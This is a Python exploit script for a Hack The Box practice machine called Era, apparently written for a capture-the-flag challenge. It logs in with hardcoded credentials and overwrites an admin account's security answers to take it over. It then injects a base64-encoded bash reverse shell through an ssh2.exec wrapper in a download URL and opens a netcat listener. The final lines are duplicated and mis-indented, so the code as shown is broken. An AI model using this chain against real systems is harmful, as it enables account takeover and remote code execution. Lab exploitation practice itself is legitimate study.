# PRIVATE PoC for HTB Era (active machine) - DO NOT SHARE PUBLICLY until retirement
# Made by copper_nail aka symphony2colour
# Will publish after machine retirement

import argparse
import base64
import logging
import requests
import re
import subprocess
import sys
import time


# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='[%(levelname)s] %(message)s'
)

#Necessary URLs
LOGIN_URL = "http://file.era.htb/login.php"
RESET_URL = "http://file.era.htb/reset.php"
LOGOUT_URL = "http://file.era.htb/logout.php"
SECURITY_URL = "http://file.era.htb/security_login.php"
DASHBOARD_URL = "http://file.era.htb/manage.php"
TARGET_URL = "http://file.era.htb/download.php"


username = "yuri"
password = "mustang"

ANSWER = "test"
admin = "admin_ef01cab31aa"

def parse_args():
    parser = argparse.ArgumentParser(description="PoC for Era HTB box")
    parser.add_argument("ip", help="Your listener IP address (for reverse shell, etc.)")
    parser.add_argument("port", help="Your listener port", type=int)
    parser.add_argument("--no-listen", action="store_true", help="Skip auto listener")
    return parser.parse_args()


def login(username, password):
    
    session = requests.session()
    response = session.get(LOGIN_URL)

    # Get cookies
    cookie = session.cookies.get_dict()

    logging.info(f"[+] Your initial cookie is:{cookie}")
    cookie_value = cookie["PHPSESSID"]
    
    if not cookie_value:
        logging.warning("[-] Failed to extract PHPSESSID.")
        sys.exit(1)
    
    login_data = {
        "username": username,
        "password": password,
        "submitted": "true",
        }
        
    LOGIN_HEADERS = {
        "Host": "file.era.htb", 
        "User-Agent": "HTB/5.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Referer": LOGIN_URL,
        "Content-Type": "application/x-www-form-urlencoded",
        "DNT": "1",
        "Connection": "keep-alive",
        "Cookie": f"PHPSESSID={cookie_value}",
        }
        
    response = session.post(LOGIN_URL, data=login_data, headers=LOGIN_HEADERS)  
      
    if response.status_code == 200:
        logging.info("[+] Successful login!")
    else:
        logging.warning("Something went wrong, check your credentials")

    return session



def get_admin(session_value):
    #Getting Admin Access
    
    logging.info("[+] Resetting admin security questions...")
    reset_data = {
        "username": admin,
        "new_answer1": ANSWER,
        "new_answer2": ANSWER,
        "new_answer3": ANSWER,
        }
         
    RESET_HEADERS = {
        "User-Agent": "HTB/5.0",
        "Referer": RESET_URL,
        "Content-Type": "application/x-www-form-urlencoded",
        }
    reset_response = session.post(RESET_URL, data=reset_data, headers=RESET_HEADERS)
      
    if reset_response.status_code == 200:
        logging.info("[+] Successfully reset admin account")      
    else:
        logging.warning("[-] Something went wrong...")
    
    logout_response = session.get(LOGOUT_URL, headers=RESET_HEADERS)
    
    if logout_response.status_code == 200:
        logging.info("[+] Logged out...")
    else:
        logging.warning("[-] Something went wrong...")
    
    
    
    admin_session = requests.session()
    admin_session.get(SECURITY_URL)
    
    
    admin_data = {
        "username": admin,
        "answer1": ANSWER,
        "answer2": ANSWER,
        "answer3": ANSWER,
        }
        
    ADMIN_HEADERS = {
        "User-Agent": "HTB/5.0",
        "Referer": SECURITY_URL,
        "Content-Type": "application/x-www-form-urlencoded",
        }
        
    admin_response = admin_session.post(SECURITY_URL, data=admin_data, headers=ADMIN_HEADERS)
    logging.info(f"[+] Response after security login: {admin_response.status_code}")
    logging.info(f"[+] Admin cookie is: {admin_session.cookies.get_dict()}")
    
    if admin_response.status_code == 200:
        logging.info("[+] Successful login as admin")    
    else:
        logging.warning("[-] Something went wrong...")   
        
    response = admin_session.get("http://file.era.htb/manage.php")

    if admin_response.status_code == 200 and "login.php" not in response.text:
        logging.info("[+] Reached dashboard as admin")
    else:
        logging.warning("[-] Stuck on login.php")   
        sys.exit("[-] Exiting: Admin login failed or redirected.")
    return admin_session
    
    
 
def check_available_files(session):
    url = DASHBOARD_URL
    response = session.get(url)
    
    if response.status_code != 200:
        logging.warning("[-] Failed to load dashboard")
        return[]
        
    html = response.text
    #Match links like :<a href="download.php?id=150">filename.ext<a>
    pattern = r'<a\s+href="download\.php\?id=(\d+)">([^<]+)</a>'
    matches = re.findall(pattern, html)
    
    files = []
    for file_id, filename in matches:
        files.append((file_id, filename.strip()))
        logging.info(f"[+] Found file: {filename.strip()} (ID: {file_id})")
    
    return files
    
    
def exploit(session, files, ip, port):

    if not files:
        sys.exit("[-] Exiting: No files found on server, please upload one.")

    file_id, filename = files[0]
    logging.info(f"[+] Using file: {filename} (ID: {file_id})")

    raw_payload = f'/bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1'
    encoded_payload = base64.b64encode(raw_payload.encode()).decode()
    cmd = f'echo {encoded_payload}|base64 -d|bash|'

    TARGET = f"{TARGET_URL}?id={file_id}&show=true&format=ssh2.exec://yuri:mustang@127.0.0.1/{cmd}"
    logging.info(f"[+] Sending payload to: {TARGET}")
    r = session.get(TARGET, allow_redirects=True)
    
    logging.info(f"[+] Triggering shell... enjoy")
    time.sleep(1)
    

def start_listener(port):
    logging.info(f"[+] Starting listener on port {port}...")

    return subprocess.Popen(
        ["nc", "-lvnp", str(port)],
        stdin=None,
        stdout=None,
        stderr=subprocess.DEVNULL
    )
    
if __name__ == "__main__":             
    args = parse_args()
    ip = args.ip
    port = args.port
    logging.info(f"[+] Using IP: {ip}")
    logging.info(f"[+] Using PORT: {port}")
     
    session = login(username, password)
    admin_session = get_admin(session)
    files = check_available_files(admin_session)

    if not args.no_listen:
        try:
            listener_proc = start_listener(port)
            time.sleep(2)  # Give listener time to spin up
            exploit(admin_session, files, ip, port)
            listener_proc.wait()
        except KeyboardInterrupt:
            print("\n[!] Interrupted. Cleaning up...")
            listener_proc.terminate()
    else:
        exploit(admin_session, files, ip, port)
            listener_proc.terminate()
    else:
        exploit(admin_session, files, ip, port)
